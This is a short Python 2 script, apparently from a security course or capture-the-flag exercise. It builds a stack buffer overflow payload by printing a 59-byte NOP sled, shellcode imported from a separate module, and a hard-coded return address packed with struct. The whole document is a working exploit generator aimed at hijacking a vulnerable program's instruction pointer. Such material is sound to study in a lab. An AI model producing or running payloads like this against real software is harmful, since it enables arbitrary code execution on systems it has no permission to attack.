from shellcode import shellcode
import struct

eip = struct.pack("@I",0xbfffed7c)
nop = "\x90"
print(nop *59 + shellcode + eip)

